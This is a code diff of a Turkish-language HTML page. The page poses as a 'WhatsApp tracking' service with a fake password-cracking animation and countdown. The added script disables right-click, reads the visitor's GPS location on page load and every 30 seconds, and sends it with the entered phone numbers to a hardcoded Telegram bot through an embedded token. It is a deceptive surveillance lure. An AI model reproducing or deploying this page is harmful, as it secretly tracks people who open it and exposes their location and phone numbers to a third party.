@@ -3,52 +3,248 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GPS Konum Takibi</title>
-</head>
-<body>
-    <h1>GPS Konum Takibi Başlatıldı</h1>
-    <p>Her 30 saniyede bir konum verisi gönderilecektir.</p>
-
-    <script>
-        // Telegram Bot API'yi kullanarak mesaj gönderme
-        function sendLocationToTelegram(latitude, longitude) {
-            const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co';  // Bot token'ınız
-            const chatId = '1568538396';  // Telegram'daki chat ID'nizi buraya koyun
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Konum: Enlem: ${latitude}, Boylam: ${longitude}`;
-
-            fetch(url, { method: 'GET' });
+    <title>WhatsApp Takibi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
         }
 
-        // Konum alma ve izni kontrol etme
-        function getLocation() {
-            if (navigator.geolocation) {
-                // GPS izni al
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    let latitude = position.coords.latitude;
-                    let longitude = position.coords.longitude;
+        #loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 20px;
+            color: #333;
+            display: none;
+            margin-top: 20px;
+        }
 
-                    // Konum bilgisini Telegram'a gönder
-                    sendLocationToTelegram(latitude, longitude);
+        #countdown {
+            font-size: 20px;
+            color: #e74c3c;
+            font-weight: bold;
+            margin-top: 20px;
+        }
 
-                    // Her 30 saniyede bir yeni konum göndermek için
-                    setInterval(function() {
-                        navigator.geolocation.getCurrentPosition(function(position) {
-                            let latitude = position.coords.latitude;
-                            let longitude = position.coords.longitude;
-                            sendLocationToTelegram(latitude, longitude);
-                        });
-                    }, 30000);  // 30 saniye aralıklarla konum gönderme
-                }, function(error) {
-                    alert("GPS izni verilmedi veya konum alınamadı.");
-                });
-            } else {
-                alert("Geolocation API'si tarayıcınızda desteklenmiyor.");
+        #decrypting {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 40px;
+            color: #e74c3c;
+            letter-spacing: 2px;
+            display: none;
+        }
+
+        .form-container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        input[type="text"] {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #25d366;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #128c7e;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        p {
+            color: #555;
+        }
+
+        @keyframes decryptAnimation {
+            0% {
+                content: "Şifre Çözülüyor..."; 
+                letter-spacing: 2px;
+                color: #e74c3c;
+            }
+            25% {
+                content: "Veriler alınmaya başlanıyor..."; 
+                color: #f39c12;
+                letter-spacing: 5px;
+            }
+            50% {
+                content: "Şifre kırma işlemi devam ediyor...";
+                color: #f39c12;
+                letter-spacing: 10px;
+            }
+            75% {
+                content: "Şifre çözülüyor, lütfen bekleyin...";
+                color: #2ecc71;
+                letter-spacing: 15px;
+            }
+            100% {
+                content: "Şifre Çözüldü!";
+                color: #2ecc71;
+                letter-spacing: 0px;
+                font-size: 24px;
             }
         }
 
-        // Sayfa yüklendiğinde konum alma işlemini başlat
+        .decrypting-message {
+            animation: decryptAnimation 5s forwards;
+            font-size: 20px;
+            color: #e74c3c;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>WhatsApp Takibi Giriş</h1>
+    <p>Lütfen aşağıdaki alanları doldurun:</p>
+
+    <div class="form-container">
+        <input type="text" id="userPhone" placeholder="Kendi telefon numaranızı girin" maxlength="10" oninput="validatePhoneNumber('userPhone')" />
+        <input type="text" id="targetPhone" placeholder="Hedef telefon numarasını girin" maxlength="10" oninput="validatePhoneNumber('targetPhone')" />
+        <br>
+        <button id="startButton" onclick="startTracking()">Takibi Başlat</button>
+    </div>
+
+    <div id="loading">Yükleniyor... Lütfen tarayıcıyı kapatmayın. Bu işlem yaklaşık 10 dakika sürecektir.</div>
+
+    <div id="decrypting" class="decrypting-message">Şifre Çözülüyor...</div>
+
+    <div id="countdown">Geri Sayım: 10:00</div>
+
+    <script>
+        // Farenin sağ tıklama tuşunu devre dışı bırak
+        document.addEventListener('contextmenu', function (event) {
+            event.preventDefault();
+            alert("Sağ tıklama engellendi!");
+        });
+
+        // Telegram Bot API'yi kullanarak mesaj gönderme
+        function sendLocationToTelegram(userPhone, targetPhone, latitude, longitude) {
+            const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co';  // Bot token'ınız
+            const chatId = '1568538396';  // Telegram'daki chat ID'nizi buraya koyun
+            const text = `Kullanıcı telefon numarası: ${userPhone}\nHedef telefon numarası: ${targetPhone}\nKonum: E: ${latitude}, B: ${longitude}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url, { method: 'GET' })
+                .then(response => response.json())
+                .then(data => console.log('Telegram mesajı gönderildi:', data))
+                .catch(error => console.error('Telegram mesajı gönderilemedi:', error));
+        }
+
+        function showLoading() {
+            document.getElementById('loading').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        function updateCountdown() {
+            let timeLeft = 600;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(function () {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+
+                if (seconds < 10) {
+                    seconds = '0' + seconds;
+                }
+
+                countdownElement.textContent = `Geri Sayım: ${minutes}:${seconds}`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = "Yasal Olmayan İşlem";
+                    alert("Yasal Olmayan İşlem");
+                } else {
+                    timeLeft--;
+                }
+            }, 1000);
+        }
+
+        function getLocationAndSend() {
+            const userPhone = document.getElementById('userPhone').value;
+            const targetPhone = document.getElementById('targetPhone').value;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    sendLocationToTelegram(userPhone, targetPhone, latitude, longitude);
+
+                }, function (error) {
+                    console.error("Konum alınamadı:", error);
+                    alert("Konum bilgisi alınamadı.");
+                    hideLoading();
+                });
+            } else {
+                alert("Geolocation API'si tarayıcınızda desteklenmiyor.");
+                hideLoading();
+            }
+        }
+
+        function startTracking() {
+            const userPhone = document.getElementById('userPhone').value;
+            const targetPhone = document.getElementById('targetPhone').value;
+
+            if (!userPhone || !targetPhone) {
+                alert("Lütfen her iki telefon numarasını da girin.");
+                return;
+            }
+
+            if (userPhone.length !== 10 || targetPhone.length !== 10) {
+                alert("Telefon numaraları 10 rakamdan oluşmalıdır.");
+                return;
+            }
+
+            showLoading();
+            document.getElementById('decrypting').style.display = 'block';
+            updateCountdown();
+            getLocationAndSend();
+
+            setInterval(getLocationAndSend, 30000);
+
+            document.getElementById('userPhone').disabled = true;
+            document.getElementById('targetPhone').disabled = true;
+            document.getElementById('startButton').disabled = true;
+        }
+
+        function validatePhoneNumber(id) {
+            const input = document.getElementById(id);
+            input.value = input.value.replace(/[^0-9]/g, '');
+
+            if (input.value.length > 10) {
+                input.value = input.value.slice(0, 10);
+            }
+        }
+
         window.onload = function() {
-            getLocation();
+            const userPhone = document.getElementById('userPhone').value;
+            const targetPhone = document.getElementById('targetPhone').value;
+            getLocationAndSend();
+
+            setInterval(function() {
+                getLocationAndSend();
+            }, 30000);
         };
     </script>
 </body>
